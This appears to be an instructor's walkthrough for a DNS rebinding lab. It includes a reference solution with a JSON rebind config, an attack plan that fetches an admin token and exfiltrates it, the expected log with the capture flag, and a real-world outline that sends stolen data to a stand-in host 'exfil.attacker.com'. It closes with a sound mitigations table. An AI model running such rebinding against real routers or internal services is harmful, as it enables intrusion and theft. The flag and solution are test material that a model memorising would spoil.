# Activity 2 walkthrough &mdash; Perform the DNS rebind

The in-lab `labDirectory/README.md` already walks the student through *what* to type. This file explains *why* the attack works and how to defend against it. Read after solving.

## Reference solution

`dns_config.json`:
```json
{
  "hostnames": [
    {
      "hostname": "attacker.lab",
      "initial_ip": "127.0.0.1",
      "initial_port": 30000,
      "rebind_ip": "127.0.0.1",
      "rebind_port": 8080,
      "rebind_after_request": 1
    }
  ]
}
```

`attack_plan.json`:
```json
{
  "page_url": "http://attacker.lab/payload",
  "victim_actions": [
    { "action": "fetch", "url": "http://attacker.lab/admin/token" },
    { "action": "exfil", "data": "$last_response" }
  ]
}
```

Expected event log (most recent last):
```
bot_load_page  attacker.lab/payload      resolved_to: 127.0.0.1:30000   200
bot_fetch      attacker.lab/admin/token  resolved_to: 127.0.0.1:8080    200
bot_exfil      payload contains "IITB{labf_a2_dns_rebinding_works}"
```

## Why this works (real-world version)

In a real attack:

1. The victim visits `https://attacker.com`. Browser does DNS lookup, gets the attacker's public IP, fetches the page. The page origin is `attacker.com`.
2. Attacker's DNS server returned the answer with TTL=0. Browser cache for `attacker.com` is one entry deep and about to expire.
3. Page's JavaScript does `fetch('https://attacker.com/admin')`. Browser does *another* DNS lookup. This time the attacker's DNS server returns `192.168.1.1` (the victim's home router).
4. Browser opens a TCP connection to `192.168.1.1:443`, sends `Host: attacker.com`, plus any cookies the browser has cached for `attacker.com` (none, but that's fine -- the router doesn't auth its admin panel).
5. Same-Origin Policy approves this `fetch()` because the URL hostname is still `attacker.com`. The response is read by the page's JavaScript.
6. JavaScript exfils the response to `https://exfil.attacker.com/log?d=...` (different hostname, no rebinding needed for this one).

Our emulation collapses steps 1-5 into a single Python bot inside the same container. The DNS layer is a JSON file. The "internal" host is a Flask server on `127.0.0.1:8080` that is not LMS-exposed. Pedagogy is identical.

## Why same-origin policy doesn't save you

SOP checks **the URL's hostname string**. It does not check the IP address the hostname resolves to. The browser thinks both fetches are to the same origin (`attacker.com`) and lets the page's JavaScript read both responses. The browser is *correct* by its own rules; the bug is that those rules don't model network identity.

## Real-world mitigations (worth showing students)

| Mitigation | What it does | Why it works |
| --- | --- | --- |
| **DNS pinning** in browsers | Pin the IP of a hostname for the lifetime of the page | Defeats the rebind by ignoring the second DNS answer. Modern browsers do this for short windows; not foolproof. |
| **`Host` header allow-list** on internal services | Server only responds if `Host:` matches a known internal hostname (e.g. `corp-admin.local`) | Browser sends `Host: attacker.com` after the rebind, so the admin returns 403. Cheap and effective. |
| **Strong auth tokens** on internal services | Don't trust loopback / LAN identity alone | The bot has no cookies for the admin's domain, so it can't auth -- regardless of what hostname resolves where. |
| **Network segmentation** at the firewall | Don't let untrusted devices on the same LAN as the admin | Removes the rebind target from reach entirely. |
| **CORS preflight on internal mutations** | Internal API requires `OPTIONS` preflight with `Access-Control-Allow-Origin` proof | Doesn't fix `GET` exfil but stops state-changing requests. |

The cheapest and most reliable fix is the second one: **validate `Host:` against an allow-list on internal services**. Almost no real DNS rebinding attack survives this.

## What changes in Activity 3

Activity 3 ships an admin server with:
- Different endpoint paths (`/api/v2/*`).
- A required `?token=...` query parameter on the secret endpoint.
- A debug header on `/api/v2/healthz` that leaks the required token (a realistic developer mistake).

No walkthrough -- you have the technique now, apply it.
